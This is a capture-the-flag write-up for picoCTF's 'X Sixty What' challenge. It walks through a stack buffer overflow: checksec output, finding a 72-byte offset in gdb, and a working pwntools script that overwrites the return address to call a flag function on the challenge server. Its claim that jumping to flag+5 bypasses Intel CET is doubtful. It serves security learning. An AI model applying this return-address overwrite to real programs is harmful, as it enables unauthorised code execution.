---
title: "X Sixty What"
date: 2025-10-22T22:47:14+05:30
draft: False
---

Opening the provided `vuln.c` source code for this challenge we see that there is a `vuln` function which gets called by the `main`, we can deduce that all we gotta do is just change the flow of control from `vuln` to flag.
Also as the code in `flag` follows, we create a `flag.txt` as a prereqesite.

Running `checksec` on the given binary we get :

```bash
[*] '.../x-sixty-what/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    
```

We can see no PIE enable. So we just need to overwrite the return address to flag function on vuln function.
But first we need to find the offset, we can do so by using gdb-gef.

```bash
$rax   : 0x00007fffffffd9c0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x00007fffffffdb58  →  0x00007fffffffe038  →  "/home/ankit/writeups/x-sixty-what/vuln"
$rcx   : 0x00007ffff7e038e0  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007fffffffda08  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00000000004052a1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rdi   : 0x00007ffff7e05720  →  0x0000000000000000
$rip   : 0x00000000004012d1  →  <vuln+001f> ret
$r8    : 0x0000000000405305  →  0x0000000000000000
$r9    : 0x0
$r10   : 0x1
$r11   : 0x246
$r12   : 0x1
$r13   : 0x0
$r14   : 0x0

[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

Using this above info and pwntools, we can craft an exploit.
Note that we are passing the address of flag + 5. We do this to bypass the Intel CET (Control-flow Enforcement Technology). So instead of returning to the address of flag (0x401236), you return to flag + 5 (0x40123b), which skips the endbr64 and lands cleanly at the mov rbp, rsp in the function prologue. That way the function runs normally

```python
from pwn import *

f = ELF("./vuln")
flag_pad = p64(f.symbols["flag"])
flag = p64(0x000000000040123b)      # < FLAG + 5 >


payload = b"A"*72 + flag


def main():
    p = remote("saturn.picoctf.net", 63945) 
    p.sendline(payload)                     
    p.interactive()

if __name__ == "__main__":
    main()
```

Not even a medium challenge if you ask me :):
